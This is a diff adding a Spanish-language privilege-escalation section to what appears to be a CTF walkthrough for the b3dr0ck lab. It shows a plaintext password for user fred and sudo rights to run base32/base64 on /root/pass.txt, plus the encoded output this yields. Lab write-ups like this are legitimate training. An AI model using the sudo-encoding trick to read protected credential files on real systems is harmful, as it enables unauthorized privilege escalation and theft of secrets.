@@ -57,3 +57,21 @@ User barney may run the following commands on b3dr0ck:
  user: fred
  pass: YabbaDabbaD0000!
  
+ # FRED
+ ## privilege escalation
+ Descubrimos que Fred puede ejecutar con sudo:
+ ```
+  fred@b3dr0ck:~$ sudo -l
+Matching Defaults entries for fred on b3dr0ck:
+    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User fred may run the following commands on b3dr0ck:
+    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
+    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
+
+ ```
+ con lo cual obtenemos:
+ base32: JRDEWRKDGUZFUS2SINMFGV2LLBEVUVSVGQZUWSSHJZGVQVKSJJJUYRSXKZJTKMSPKBFECWCVKRGE
+4SSKKZKTEUSDK5HEER2YKVJFITCKLJFUMU2TLFFQU===
+ base64: TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dO
+QkdYVVJUTEpaS0ZTU1lLCg==
